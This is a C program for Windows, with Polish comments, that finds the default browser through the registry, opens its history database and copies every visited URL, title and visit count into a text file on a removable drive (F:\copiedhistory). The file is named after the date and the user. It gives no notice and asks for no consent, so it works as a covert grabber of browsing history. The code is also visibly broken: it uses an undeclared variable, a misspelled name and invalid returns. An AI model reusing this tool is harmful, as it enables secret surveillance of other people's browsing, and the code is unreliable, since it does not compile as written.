#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sqlite3.h>
#include <windows.h>
#include <winbase.h>
#include <sys/stat.h>
#include <sys/types.h>

char username[256];
char browserPath[512];

void getDate(char *date, size_t size) {
	time_t t = time(NULL);
	struct tm tm = *localtime(&t);
	snprintf(date, size, "%d_%02d.%02d", tm.tm_year + 1900, tm.tm_mday, tm.tm_mon + 1);
}

void getUser(char *username, DWORD *size) {
	GetUserNameA(username, size);
}

void getLocation() {
	HKEY hKey;
	DWORD bufferSize = sizeof(browserPath);
	LONG result;

	result = RegOpenKeyEx(HKEY_CLASSES_ROOT, "http\\shell\\open\\command", 0, KEY_READ, &hKey);
	if (result != ERROR_SUCCESS) {
		printf("Błąd otwierania rejestru.\n");
		return;
	}

	result = RegQueryValueEx(hKey, "", NULL, NULL, (LPBYTE)browserPath, &bufferSize);
	if (result == ERROR_SUCCESS) {
        	char *spacePos = strchr(browserPath, ' ');
        	if (spacePos != NULL) {
            		*spacePos = '\0';
		}
	} else {
        	printf("Błąd odczytu rejestru.\n");
	}

	RegCloseKey(hKey);

	if (strstr(browserPath, "chrome.exe") != NULL) {

        	snprintf(browserPath, sizeof(browserPath), "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History", username);
    
	} else if (strstr(browserPath, "firefox.exe") != NULL) {

		snprintf(browserPath, sizeof(browserPath), "C:\\Users\\%s\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\",username);

		DIR *dir = opendir(browserPath);
		struct dirent *entry;
    		while ((entry = readdir(dir)) != NULL) {
        		if (strstr(entry->d_name, ".default-release") != NULL) {
            			snprintf(browserPath, sizeof(browserPath), "%s\\%s\\places.sqlite", browserPath, entry->d_name);
            			break;
        		}
    		}
    		closedir(dir);

	} else if (strstr(browserPath, "msedge.exe") != NULL) {

        	snprintf(browserPath, sizeof(browserPath), "C:\\Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History", username);
    
	} else if (strstr(browserPath, "opera.exe") != NULL) {

        	snprintf(browserPath, sizeof(browserPath), "C:\\Users\\%s\\AppData\\Roaming\\Opera Software\\Opera Stable\\History", username);
    
	} else if (strstr(browserPath, "brave.exe") != NULL) {

        	snprintf(browserPath, sizeof(browserPath), "C:\\Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History", username);

	} else {

		printf("Nie rozpoznano domyślnej przeglądarki.\n");

	}
}

void sqliteConvert() {
	sqlite3 *db;
    	sqlite3_stmt *stmt;

	int rc = sqlite3_open(browserPath, &db);
	if (rc) {
        	printf("Nie można otworzyć bazy danych: %s\n", sqlite3_errmsg(db));
        	return 1;
    	}

	const char *sql = "SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC";

	rc = sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
    	if (rc != SQLITE_OK) {
        	printf("Błąd zapytania: %s\n", sqlite3_errmsg(db));
        	sqlite3_close(db);
        	return 1;
    	}

	if (mkdir("F:/copiedhistory", 0777) == -1) {
        	printf("\n\n\nFolder failed\n\n\n");
    	}

	FILE *file = fopen(fileName, "w");
    	if (!file) {
        	printf("Błąd otwierania\n");
        	sqlite3_finalize(stmt);
        	sqlite3_close(db);
        	return 1;
    	}

	while (sqlite3_step(stmt) == SQLITE_ROW) {
        	const char *url = (const char *)sqlite3_column_text(stmt, 0);
        	const char *title = (const char *)sqlite3_column_text(stmt, 1);
        	int visit_count = sqlite3_column_int(stmt, 2);

        	fprintf(file, "URL: %s\nTytuł: %s\nOdwiedzin: %d\n\n",
                	url ? url : "Brak",
                	title ? title : "Brak",
                	visit_count);
    	}

    	fclose(file);
    	sqlite3_finalize(stmt);
    	sqlite3_close(db);
}

int main(int argc, char *argv[]) {
	// Pobranie daty do późniejszego nazwania pliku
	char date[16];
	getDate(date, sizeof(date));

	// Pobranie nazwy użytkownika do późniejszego nazwania pliku i dostępu do plików systemowych
	DWORD userSize = sizeof(username);
	getUser(username, &userSize);

	// Konstrukcja nazwy pliku
	char fileName[1024];
	snprintf(fileName, sizeof(filename), "F:\\copiedhistory\\%s-%s.txt", date, username);

	// Pobranie lokalizacji historii
	getLocation();

	// Convertowanie .sqlite na .txt i przeżucenie na pendrive
	sqliteConvert();
}
